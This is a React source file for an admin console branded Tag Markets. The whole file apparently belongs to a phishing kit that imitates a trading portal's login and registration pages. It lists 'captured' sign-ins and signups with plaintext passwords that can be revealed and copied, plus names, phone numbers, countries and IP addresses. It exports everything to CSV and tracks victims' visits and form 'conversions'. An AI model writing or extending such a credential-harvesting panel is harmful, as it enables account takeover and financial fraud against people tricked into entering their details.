"use client";

import { useCallback, useEffect, useMemo, useState } from "react";

import type { PortalEvent, PortalStats } from "@/types/portal";

const REFRESH_MS = 4000;

const timeFormat = new Intl.DateTimeFormat("en-GB", {
  day: "2-digit",
  month: "short",
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit",
});

function formatTime(iso: string) {
  const date = new Date(iso);
  return Number.isNaN(date.getTime()) ? iso : timeFormat.format(date);
}

function relativeTime(iso: string) {
  const seconds = Math.max(0, Math.round((Date.now() - new Date(iso).getTime()) / 1000));
  if (seconds < 60) return `${seconds}s ago`;
  const minutes = Math.round(seconds / 60);
  if (minutes < 60) return `${minutes}m ago`;
  const hours = Math.round(minutes / 60);
  if (hours < 24) return `${hours}h ago`;
  return `${Math.round(hours / 24)}d ago`;
}

function csvEscape(value: string) {
  return /[",\n]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
}

function toCsv(events: PortalEvent[]) {
  const header = [
    "type",
    "timestamp",
    "email",
    "password",
    "first_name",
    "last_name",
    "country",
    "phone_code",
    "phone",
    "account_type",
    "company_name",
    "remember",
    "agreements",
    "ip",
    "user_agent",
  ];
  const rows = events.map((event) =>
    event.kind === "login"
      ? [
          "login",
          event.at,
          event.email,
          event.password,
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          String(event.remember),
          "",
          event.ip,
          event.userAgent,
        ]
      : [
          "signup",
          event.at,
          event.email,
          event.password,
          event.firstName,
          event.lastName,
          event.country,
          event.phoneCode,
          event.phone,
          event.accountType,
          event.companyName,
          "",
          String(event.agreements),
          event.ip,
          event.userAgent,
        ],
  );
  return [header, ...rows].map((row) => row.map(csvEscape).join(",")).join("\n");
}

function EyeIcon({ open }: { open: boolean }) {
  return open ? (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" className="h-4 w-4">
      <path d="M3 3l18 18" strokeLinecap="round" />
      <path d="M10.6 5.1A10.9 10.9 0 0112 5c5 0 9 4.5 9 7 0 .8-.4 1.9-1.2 3" strokeLinecap="round" />
      <path d="M6.3 6.5C4 8.2 3 10.4 3 12c0 2.5 4 7 9 7 1.5 0 2.9-.4 4.1-1" strokeLinecap="round" />
      <path d="M9.9 9.9a3 3 0 004.2 4.2" strokeLinecap="round" />
    </svg>
  ) : (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" className="h-4 w-4">
      <path d="M3 12c0-2.5 4-7 9-7s9 4.5 9 7-4 7-9 7-9-4.5-9-7z" />
      <circle cx="12" cy="12" r="3" />
    </svg>
  );
}

function CopyIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" className="h-4 w-4">
      <rect x="9" y="9" width="11" height="11" rx="2" />
      <path d="M5 15V5a2 2 0 012-2h8" strokeLinecap="round" />
    </svg>
  );
}

function StatCard({ label, value, hint }: { label: string; value: string; hint?: string }) {
  return (
    <div className="rounded-2xl border border-white/10 bg-white/[0.03] p-5">
      <p className="text-[11px] font-semibold uppercase tracking-[0.14em] text-neutral-500">{label}</p>
      <p className="mt-2 text-3xl font-semibold text-white">{value}</p>
      {hint ? <p className="mt-1 text-xs text-neutral-500">{hint}</p> : null}
    </div>
  );
}

const PAGE_LABELS: Record<string, string> = {
  home: "Home",
  login: "Login",
  signup: "Register",
  other: "Other",
};

function countryFlag(code: string) {
  if (!/^[A-Z]{2}$/.test(code)) return "🌐";
  return String.fromCodePoint(...[...code].map((char) => 127397 + char.charCodeAt(0)));
}

function countryName(code: string) {
  if (!code) return "Unknown";
  try {
    return new Intl.DisplayNames(["en"], { type: "region" }).of(code) ?? code;
  } catch {
    return code;
  }
}

function Bar({ value, max, tone }: { value: number; max: number; tone: string }) {
  const width = max > 0 ? Math.max(2, Math.round((value / max) * 100)) : 0;
  return (
    <div className="h-1.5 w-full overflow-hidden rounded-full bg-white/10">
      <div className={`h-full rounded-full ${tone}`} style={{ width: `${width}%` }} />
    </div>
  );
}

function TrafficPanel({ stats }: { stats: PortalStats }) {
  const maxPage = Math.max(1, ...stats.byPage.map((page) => page.visits));
  const maxDaily = Math.max(1, ...stats.daily.map((day) => day.visits));
  const maxCountry = Math.max(
    1,
    ...stats.byCountry.map((country) => country.visits + country.logins + country.signups),
  );
  const conversion =
    stats.totals.visits > 0
      ? ((stats.totals.logins + stats.totals.signups) / stats.totals.visits) * 100
      : 0;

  return (
    <section className="mt-8">
      <div className="flex flex-wrap items-end justify-between gap-2">
        <div>
          <h2 className="text-lg font-semibold text-white">Traffic</h2>
          <p className="text-xs text-neutral-500">
            Page views and conversions from the last 14 days · updated{" "}
            {new Date(stats.generatedAt).toLocaleTimeString("en-GB")}
          </p>
        </div>
        <p className="text-xs text-neutral-500">
          Conversion to a form submit:{" "}
          <span className="font-semibold text-[#c9f95a]">{conversion.toFixed(1)}%</span>
        </p>
      </div>

      <div className="mt-4 grid gap-4 sm:grid-cols-2 lg:grid-cols-4">
        <StatCard
          label="Visits (7d)"
          value={String(stats.totals.visitsWeek)}
          hint={`${stats.totals.visits} all time`}
        />
        <StatCard label="Visits today" value={String(stats.totals.visitsToday)} hint="UTC day" />
        <StatCard
          label="Unique visitors"
          value={String(stats.totals.uniqueVisitors)}
          hint="Per browser, best effort"
        />
        <StatCard
          label="Conversions"
          value={String(stats.totals.logins + stats.totals.signups)}
          hint={`${stats.totals.logins} logins · ${stats.totals.signups} signups`}
        />
      </div>

      <div className="mt-4 grid gap-4 lg:grid-cols-2">
        <div className="rounded-2xl border border-white/10 bg-white/[0.02] p-5">
          <h3 className="text-sm font-semibold text-white">Where they land</h3>
          <div className="mt-4 space-y-3">
            {stats.byPage.length === 0 ? (
              <p className="text-xs text-neutral-500">No page views recorded yet.</p>
            ) : (
              stats.byPage.map((page) => (
                <div key={page.page}>
                  <div className="flex items-baseline justify-between text-xs">
                    <span className="text-neutral-300">{PAGE_LABELS[page.page] ?? page.page}</span>
                    <span className="text-neutral-500">
                      {page.visits} views · {page.visitors} visitors
                    </span>
                  </div>
                  <div className="mt-1.5">
                    <Bar value={page.visits} max={maxPage} tone="bg-[#c9f95a]" />
                  </div>
                </div>
              ))
            )}
          </div>
        </div>

        <div className="rounded-2xl border border-white/10 bg-white/[0.02] p-5">
          <h3 className="text-sm font-semibold text-white">Top countries</h3>
          <div className="mt-3 overflow-x-auto">
            <table className="w-full text-left text-xs">
              <thead>
                <tr className="text-[10px] uppercase tracking-[0.12em] text-neutral-600">
                  <th className="pb-2 font-semibold">Country</th>
                  <th className="pb-2 text-right font-semibold">Views</th>
                  <th className="pb-2 text-right font-semibold">Logins</th>
                  <th className="pb-2 text-right font-semibold">Signups</th>
                </tr>
              </thead>
              <tbody>
                {stats.byCountry.length === 0 ? (
                  <tr>
                    <td colSpan={4} className="py-4 text-center text-neutral-500">
                      No traffic yet.
                    </td>
                  </tr>
                ) : (
                  stats.byCountry.map((country) => (
                    <tr key={country.country} className="border-t border-white/5">
                      <td className="py-2 text-neutral-300">
                        <span className="mr-2">{countryFlag(country.country)}</span>
                        {countryName(country.country)}
                        <span className="ml-1.5 text-[10px] text-neutral-600">
                          {country.country || "—"}
                        </span>
                        <div className="mt-1">
                          <Bar
                            value={country.visits + country.logins + country.signups}
                            max={maxCountry}
                            tone="bg-sky-400"
                          />
                        </div>
                      </td>
                      <td className="py-2 text-right text-neutral-300">{country.visits}</td>
                      <td className="py-2 text-right text-neutral-400">{country.logins}</td>
                      <td className="py-2 text-right text-neutral-400">{country.signups}</td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>

      <div className="mt-4 rounded-2xl border border-white/10 bg-white/[0.02] p-5">
        <div className="flex items-center justify-between">
          <h3 className="text-sm font-semibold text-white">Last 14 days</h3>
          <div className="flex items-center gap-3 text-[10px] uppercase tracking-wide text-neutral-500">
            <span className="flex items-center gap-1">
              <span className="h-2 w-2 rounded-sm bg-[#c9f95a]" /> views
            </span>
            <span className="flex items-center gap-1">
              <span className="h-2 w-2 rounded-sm bg-sky-400" /> logins
            </span>
            <span className="flex items-center gap-1">
              <span className="h-2 w-2 rounded-sm bg-fuchsia-400" /> signups
            </span>
          </div>
        </div>
        <div className="mt-4 flex h-32 items-end gap-1.5">
          {stats.daily.map((day) => {
            const total = day.logins + day.signups;
            const height = Math.max(3, Math.round((day.visits / maxDaily) * 100));
            return (
              <div key={day.date} className="group relative flex-1">
                <div className="flex h-32 flex-col justify-end">
                  <div
                    className="w-full rounded-t bg-[#c9f95a]/80 transition group-hover:bg-[#c9f95a]"
                    style={{ height: `${height}%` }}
                  />
                  {total > 0 ? (
                    <div className="mt-0.5 flex gap-0.5">
                      <div
                        className="flex-1 rounded-t bg-sky-400"
                        style={{ height: Math.max(2, day.logins * 3) }}
                      />
                      <div
                        className="flex-1 rounded-t bg-fuchsia-400"
                        style={{ height: Math.max(2, day.signups * 3) }}
                      />
                    </div>
                  ) : null}
                </div>
                <div className="pointer-events-none absolute -top-8 left-1/2 z-10 hidden -translate-x-1/2 whitespace-nowrap rounded bg-black/90 px-2 py-1 text-[10px] text-neutral-200 group-hover:block">
                  {day.date} · {day.visits} views · {day.logins}L / {day.signups}S
                </div>
                <p className="mt-1 text-center text-[9px] text-neutral-600">{day.date.slice(5)}</p>
              </div>
            );
          })}
        </div>
      </div>

      <div className="mt-4 overflow-hidden rounded-2xl border border-white/10 bg-white/[0.02]">
        <div className="border-b border-white/10 px-5 py-3">
          <h3 className="text-sm font-semibold text-white">Latest visits</h3>
        </div>
        <div className="overflow-x-auto">
          <table className="w-full min-w-[720px] text-left text-xs">
            <thead>
              <tr className="border-b border-white/5 text-[10px] uppercase tracking-[0.12em] text-neutral-600">
                <th className="px-4 py-2 font-semibold">When</th>
                <th className="px-4 py-2 font-semibold">Page</th>
                <th className="px-4 py-2 font-semibold">Country</th>
                <th className="px-4 py-2 font-semibold">City</th>
                <th className="px-4 py-2 font-semibold">Referrer</th>
                <th className="px-4 py-2 font-semibold">IP</th>
              </tr>
            </thead>
            <tbody>
              {stats.recentVisits.length === 0 ? (
                <tr>
                  <td colSpan={6} className="px-4 py-8 text-center text-neutral-500">
                    No visits recorded yet — open <code className="text-[#c9f95a]">/login</code> in
                    another tab to see it here.
                  </td>
                </tr>
              ) : (
                stats.recentVisits.map((visit) => (
                  <tr key={visit.id} className="border-b border-white/5 last:border-0">
                    <td className="whitespace-nowrap px-4 py-2 text-neutral-400">
                      {formatTime(visit.at)}
                    </td>
                    <td className="px-4 py-2">
                      <span className="rounded-full bg-white/[0.06] px-2 py-0.5 text-[10px] font-semibold uppercase tracking-wide text-neutral-300">
                        {PAGE_LABELS[visit.page] ?? visit.page}
                      </span>
                      <span className="ml-2 text-[10px] text-neutral-600">{visit.path}</span>
                    </td>
                    <td className="whitespace-nowrap px-4 py-2 text-neutral-300">
                      {visit.country ? `${countryFlag(visit.country)} ${visit.country}` : "—"}
                    </td>
                    <td className="px-4 py-2 text-neutral-500">{visit.city || "—"}</td>
                    <td className="max-w-[220px] truncate px-4 py-2 text-neutral-500">
                      {visit.referrer || "direct"}
                    </td>
                    <td className="whitespace-nowrap px-4 py-2 font-mono text-[10px] text-neutral-600">
                      {visit.ip}
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </section>
  );
}

function PasswordCell({ id, value }: { id: string; value: string }) {
  const [shown, setShown] = useState(false);
  const [copied, setCopied] = useState(false);

  const copy = async () => {
    try {
      await navigator.clipboard.writeText(value);
      setCopied(true);
      setTimeout(() => setCopied(false), 1200);
    } catch {
      /* clipboard unavailable */
    }
  };

  return (
    <div className="flex items-center gap-2">
      <code className="rounded bg-white/[0.06] px-2 py-1 font-mono text-[12px] text-[#d7ff70]">
        {shown ? value || "—" : "••••••••"}
      </code>
      <button
        type="button"
        onClick={() => setShown((current) => !current)}
        className="text-neutral-500 transition hover:text-neutral-200"
        aria-label={shown ? "Hide password" : "Show password"}
        aria-controls={id}
      >
        <EyeIcon open={shown} />
      </button>
      <button
        type="button"
        onClick={copy}
        className="text-neutral-500 transition hover:text-neutral-200"
        aria-label="Copy password"
      >
        {copied ? <span className="text-[10px] font-semibold text-[#d7ff70]">OK</span> : <CopyIcon />}
      </button>
    </div>
  );
}

export function AdminDashboard() {
  const [events, setEvents] = useState<PortalEvent[]>([]);
  const [stats, setStats] = useState<PortalStats | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [tab, setTab] = useState<"all" | "login" | "signup">("all");
  const [query, setQuery] = useState("");
  const [lastSync, setLastSync] = useState<Date | null>(null);

  const load = useCallback(async () => {
    try {
      const [eventsResponse, statsResponse] = await Promise.all([
        fetch("/api/admin/submissions", { cache: "no-store" }),
        fetch("/api/admin/stats", { cache: "no-store" }),
      ]);
      if (eventsResponse.status === 401) {
        window.location.href = "/admin/login";
        return;
      }
      if (!eventsResponse.ok) throw new Error("request failed");
      const payload = (await eventsResponse.json()) as { events?: PortalEvent[] };
      setEvents(payload.events ?? []);

      if (statsResponse.ok) {
        const statsPayload = (await statsResponse.json()) as { stats?: PortalStats };
        setStats(statsPayload.stats ?? null);
      }

      setLastSync(new Date());
      setError(null);
    } catch {
      setError("Could not load the activity feed.");
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    // `load` awaits the network before touching state, so this is not a
    // synchronous setState; the rule cannot see through the async call.
    // eslint-disable-next-line react-hooks/set-state-in-effect
    void load();
    const timer = setInterval(() => void load(), REFRESH_MS);
    return () => clearInterval(timer);
  }, [load]);

  const logins = useMemo(() => events.filter((event) => event.kind === "login"), [events]);
  const signups = useMemo(() => events.filter((event) => event.kind === "signup"), [events]);

  const filtered = useMemo(() => {
    const needle = query.trim().toLowerCase();
    return events.filter((event) => {
      if (tab !== "all" && event.kind !== tab) return false;
      if (!needle) return true;
      const haystack =
        event.kind === "login"
          ? `${event.email} ${event.ip}`
          : `${event.firstName} ${event.lastName} ${event.email} ${event.country} ${event.phone} ${event.ip}`;
      return haystack.toLowerCase().includes(needle);
    });
  }, [events, query, tab]);

  const uniqueEmails = useMemo(
    () => new Set(events.map((event) => event.email.toLowerCase())).size,
    [events],
  );

  const lastEvent = events[0];

  const clearAll = async () => {
    if (!window.confirm("Delete every captured login and registration?")) return;
    await fetch("/api/admin/submissions", { method: "DELETE" });
    await load();
  };

  const signOut = async () => {
    await fetch("/api/admin/auth", { method: "DELETE" });
    window.location.href = "/admin/login";
  };

  const exportCsv = () => {
    const blob = new Blob([toCsv(filtered)], { type: "text/csv;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = `tagmarkets-portal-${new Date().toISOString().slice(0, 10)}.csv`;
    link.click();
    URL.revokeObjectURL(url);
  };

  const tabs: { id: "all" | "login" | "signup"; label: string; count: number }[] = [
    { id: "all", label: "Everything", count: events.length },
    { id: "login", label: "Logins", count: logins.length },
    { id: "signup", label: "Registrations", count: signups.length },
  ];

  return (
    <div className="min-h-screen">
      <header className="sticky top-0 z-10 border-b border-white/10 bg-[#08090a]/90 backdrop-blur">
        <div className="mx-auto flex max-w-[1200px] flex-wrap items-center gap-4 px-6 py-4">
          <div className="flex items-center gap-3">
            <span className="flex h-9 w-9 items-center justify-center rounded-lg bg-[#c9f95a] text-sm font-black text-black">
              TM
            </span>
            <div>
              <p className="text-sm font-semibold tracking-wide text-white">Tag Markets</p>
              <p className="text-[11px] uppercase tracking-[0.18em] text-neutral-500">
                Admin console
              </p>
            </div>
          </div>

          <div className="ml-auto flex items-center gap-2">
            <span className="hidden items-center gap-2 text-xs text-neutral-500 sm:flex">
              <span className="relative flex h-2 w-2">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-[#c9f95a] opacity-60" />
                <span className="relative inline-flex h-2 w-2 rounded-full bg-[#c9f95a]" />
              </span>
              Live · {lastSync ? lastSync.toLocaleTimeString("en-GB") : "connecting"}
            </span>
            <button
              type="button"
              onClick={() => void load()}
              className="rounded-lg border border-white/10 px-3 py-1.5 text-xs font-medium text-neutral-300 transition hover:border-white/25 hover:text-white"
            >
              Refresh
            </button>
            <button
              type="button"
              onClick={exportCsv}
              className="rounded-lg border border-white/10 px-3 py-1.5 text-xs font-medium text-neutral-300 transition hover:border-white/25 hover:text-white"
            >
              Export CSV
            </button>
            <button
              type="button"
              onClick={() => void clearAll()}
              className="rounded-lg border border-red-500/30 px-3 py-1.5 text-xs font-medium text-red-300 transition hover:border-red-400/60 hover:text-red-200"
            >
              Clear
            </button>
            <button
              type="button"
              onClick={() => void signOut()}
              className="rounded-lg border border-white/10 px-3 py-1.5 text-xs font-medium text-neutral-400 transition hover:border-white/25 hover:text-white"
            >
              Sign out
            </button>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-[1200px] px-6 py-8">
        {stats ? <TrafficPanel stats={stats} /> : null}

        <div className="mt-10 flex flex-wrap items-end justify-between gap-2">
          <div>
            <h2 className="text-lg font-semibold text-white">Captured submissions</h2>
            <p className="text-xs text-neutral-500">Logins and registrations submitted on the portal</p>
          </div>
          {lastEvent ? (
            <p className="text-xs text-neutral-500">
              Last activity {relativeTime(lastEvent.at)} · {formatTime(lastEvent.at)}
            </p>
          ) : null}
        </div>

        <div className="mt-4 grid gap-4 sm:grid-cols-2 lg:grid-cols-4">
          <StatCard label="Logins" value={String(logins.length)} hint="Captured sign-in attempts" />
          <StatCard
            label="Registrations"
            value={String(signups.length)}
            hint="Completed signup forms"
          />
          <StatCard label="Unique emails" value={String(uniqueEmails)} hint="Across both forms" />
          <StatCard
            label="Last activity"
            value={lastEvent ? relativeTime(lastEvent.at) : "—"}
            hint={lastEvent ? formatTime(lastEvent.at) : "No events yet"}
          />
        </div>

        <div className="mt-8 flex flex-wrap items-center gap-3">
          <div className="flex rounded-xl border border-white/10 bg-white/[0.03] p-1">
            {tabs.map((item) => (
              <button
                key={item.id}
                type="button"
                onClick={() => setTab(item.id)}
                className={`rounded-lg px-3 py-1.5 text-xs font-medium transition ${
                  tab === item.id
                    ? "bg-[#c9f95a] text-black"
                    : "text-neutral-400 hover:text-white"
                }`}
              >
                {item.label}
                <span className={tab === item.id ? "ml-1.5 text-black/60" : "ml-1.5 text-neutral-600"}>
                  {item.count}
                </span>
              </button>
            ))}
          </div>

          <div className="relative ml-auto">
            <svg
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="1.8"
              className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-neutral-500"
            >
              <circle cx="11" cy="11" r="7" />
              <path d="M20 20l-3.5-3.5" strokeLinecap="round" />
            </svg>
            <input
              value={query}
              onChange={(event) => setQuery(event.target.value)}
              placeholder="Search email, name, country, IP…"
              className="w-72 rounded-xl border border-white/10 bg-white/[0.03] py-2 pl-9 pr-3 text-sm text-neutral-200 placeholder:text-neutral-600 focus:border-[#c9f95a]/60 focus:outline-none"
            />
          </div>
        </div>

        {error ? (
          <p className="mt-4 rounded-xl border border-red-500/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">
            {error}
          </p>
        ) : null}

        <div className="mt-4 overflow-hidden rounded-2xl border border-white/10 bg-white/[0.02]">
          <div className="overflow-x-auto">
            <table className="w-full min-w-[880px] text-left text-sm">
              <thead>
                <tr className="border-b border-white/10 text-[11px] uppercase tracking-[0.12em] text-neutral-500">
                  <th className="px-4 py-3 font-semibold">When</th>
                  <th className="px-4 py-3 font-semibold">Type</th>
                  <th className="px-4 py-3 font-semibold">Name</th>
                  <th className="px-4 py-3 font-semibold">Email</th>
                  <th className="px-4 py-3 font-semibold">Password</th>
                  <th className="px-4 py-3 font-semibold">Details</th>
                  <th className="px-4 py-3 font-semibold">IP</th>
                </tr>
              </thead>
              <tbody>
                {loading ? (
                  <tr>
                    <td colSpan={7} className="px-4 py-12 text-center text-sm text-neutral-500">
                      Loading captured activity…
                    </td>
                  </tr>
                ) : filtered.length === 0 ? (
                  <tr>
                    <td colSpan={7} className="px-4 py-16 text-center">
                      <p className="text-sm text-neutral-400">Nothing captured yet.</p>
                      <p className="mt-1 text-xs text-neutral-600">
                        Sign in or register on{" "}
                        <a className="text-[#c9f95a] hover:underline" href="/login">
                          /login
                        </a>{" "}
                        and the submission shows up here.
                      </p>
                    </td>
                  </tr>
                ) : (
                  filtered.map((event) => (
                    <tr
                      key={event.id}
                      className="border-b border-white/5 align-top last:border-0 hover:bg-white/[0.03]"
                    >
                      <td className="whitespace-nowrap px-4 py-3 text-neutral-400">
                        <span className="block text-neutral-300">{formatTime(event.at)}</span>
                        <span className="text-[11px] text-neutral-600">{relativeTime(event.at)}</span>
                      </td>
                      <td className="px-4 py-3">
                        <span
                          className={`rounded-full px-2 py-0.5 text-[11px] font-semibold uppercase tracking-wide ${
                            event.kind === "login"
                              ? "bg-sky-500/15 text-sky-300"
                              : "bg-[#c9f95a]/15 text-[#c9f95a]"
                          }`}
                        >
                          {event.kind === "login" ? "Login" : "Signup"}
                        </span>
                      </td>
                      <td className="px-4 py-3 text-neutral-200">
                        {event.kind === "signup" ? (
                          <>
                            <span className="block">
                              {[event.firstName, event.lastName].filter(Boolean).join(" ") || "—"}
                            </span>
                            {event.companyName ? (
                              <span className="text-[11px] text-neutral-500">{event.companyName}</span>
                            ) : null}
                          </>
                        ) : (
                          <span className="text-neutral-600">—</span>
                        )}
                      </td>
                      <td className="px-4 py-3">
                        <span className="block text-neutral-200">{event.email || "—"}</span>
                        {event.kind === "login" && event.remember ? (
                          <span className="text-[11px] text-neutral-500">remember me</span>
                        ) : null}
                      </td>
                      <td className="px-4 py-3">
                        <PasswordCell id={event.id} value={event.password} />
                      </td>
                      <td className="px-4 py-3 text-neutral-400">
                        {event.kind === "signup" ? (
                          <span className="text-[12px] leading-5">
                            {event.country || "—"}
                            <br />
                            {[event.phoneCode, event.phone].filter(Boolean).join(" ") || "—"}
                            <br />
                            <span className="text-neutral-600">
                              {event.accountType} · {event.agreements} agreement
                              {event.agreements === 1 ? "" : "s"}
                            </span>
                          </span>
                        ) : (
                          <span className="text-neutral-600">—</span>
                        )}
                      </td>
                      <td className="whitespace-nowrap px-4 py-3 font-mono text-[11px] text-neutral-500">
                        {event.ip}
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>

        <p className="mt-4 text-[11px] leading-5 text-neutral-600">
          Submissions land in Supabase (<code className="rounded bg-white/[0.06] px-1 py-0.5">portal_events</code>)
          and page views in <code className="rounded bg-white/[0.06] px-1 py-0.5">portal_visits</code>.
          Locally, without Supabase credentials, both fall back to files under{" "}
          <code className="rounded bg-white/[0.06] px-1 py-0.5">.data/</code>.
        </p>
      </main>
    </div>
  );
}
